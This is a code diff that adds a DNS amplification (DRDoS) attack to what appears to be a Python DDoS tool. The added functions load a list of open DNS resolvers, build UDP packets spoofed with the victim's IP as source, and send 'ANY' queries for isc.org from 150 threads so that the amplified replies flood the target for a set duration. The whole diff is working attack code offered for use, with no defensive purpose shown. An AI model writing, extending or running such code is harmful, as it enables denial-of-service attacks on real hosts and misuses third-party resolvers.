@@ -36,6 +36,83 @@ USER_AGENTS = [
 ]
 
 
+# --- NEW: UTILITY TO LOAD AMPLIFIER LIST ---
+def load_resolvers(filename="dns_resolvers.txt"):
+    """Loads a list of DNS resolver IP addresses from a file."""
+    try:
+        with open(filename, 'r') as f:
+            resolvers = [line.strip() for line in f if line.strip()]
+        if not resolvers:
+            print(f"[ERROR] Resolver file '{filename}' is empty.")
+            return []
+        print(f"[INFO] Loaded {len(resolvers)} DNS resolvers for amplification.")
+        return resolvers
+    except FileNotFoundError:
+        print(f"[ERROR] Could not find resolver file: {filename}")
+        return []
+
+
+# --- NEW: DNS Amplification Attack Worker ---
+# This worker sends spoofed DNS queries to a list of amplifiers.
+def dns_amplification_worker(stop_event, pause_event, victim_ip, resolvers, iface):
+    """
+    Worker thread that sends spoofed DNS queries to a list of amplifiers.
+    The source IP is spoofed to be the victim's IP.
+    """
+    # We query for "isc.org" with the "ANY" type, which is known to produce a large response,
+    # maximizing the amplification factor.
+    dns_query = DNS(rd=1, qd=DNSQR(qname="isc.org", qtype="ANY"))
+
+    while not stop_event.is_set():
+        if pause_event.is_set():
+            time.sleep(1)
+            continue
+        try:
+            # Pick a random resolver from the list for each packet
+            resolver_ip = random.choice(resolvers)
+
+            # Craft the spoofed packet:
+            # Source IP = Victim's IP
+            # Destination IP = Amplifier's IP
+            packet = IP(src=victim_ip, dst=resolver_ip) / UDP(dport=53) / dns_query
+
+            send(packet, verbose=0, iface=iface)
+        except IndexError:
+            # This happens if the resolver list is empty
+            print("[ERROR] DNS Amplification worker has no resolvers to attack. Stopping.")
+            break
+        except Exception:
+            pass
+
+
+# --- NEW: DNS Amplification Attack Controller ---
+def attack_dns_amplification(target_url, duration, stop_event, pause_event, threads=150, iface=None):
+    """Controller for DNS Amplification (DRDoS) attacks."""
+    victim_ips = resolve_to_ipv4(target_url)
+    resolvers = load_resolvers("dns_resolvers.txt")
+
+    if not victim_ips or not resolvers:
+        print("[!] DNS Amplification attack cannot start: Missing victim IP or resolver list.")
+        return
+
+    # For this attack, we target the first resolved IP of the victim
+    victim_ip = victim_ips[0]
+    print(f"[INFO] Targeting victim IP {victim_ip} for amplification attack.")
+
+    attack_end_time = time.time() + duration
+    for _ in range(threads):
+        t = threading.Thread(
+            target=dns_amplification_worker,
+            args=(stop_event, pause_event, victim_ip, resolvers, iface)
+        )
+        t.daemon = True
+        t.start()
+
+    while time.time() < attack_end_time and not stop_event.is_set():
+        time.sleep(1)
+    stop_event.set()
+
+
 # --- NEW: More Robust Tor Connection Checker ---
 def check_tor_connection():
     """
